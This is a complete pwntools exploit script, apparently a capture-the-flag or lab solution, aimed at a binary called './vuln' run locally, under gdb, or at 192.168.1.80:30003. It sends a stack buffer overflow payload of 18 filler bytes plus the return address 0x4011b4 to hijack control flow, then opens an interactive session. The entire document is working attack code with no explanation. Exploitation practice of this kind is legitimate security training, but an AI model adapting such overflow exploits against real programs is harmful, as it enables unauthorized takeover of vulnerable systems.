#00000000004011b4

from pwn import *
import sys


context.terminal = ['terminator', '-e']

binary_path="./vuln"

if len(sys.argv) < 2:
    io = remote("192.168.1.80",30003) 
elif sys.argv[1]=="l":
    io = process(binary_path)
elif sys.argv[1]=="d":
    io = gdb.debug(binary_path, '''
        break main
    ''')


payload=b"a"*18+b"\xb4\x11\x40\00\00\00\00\00"#p64(0x4011b4)
print(payload)
io.recvuntil(b":")
io.sendline(payload)
io.readline()
io.interactive()
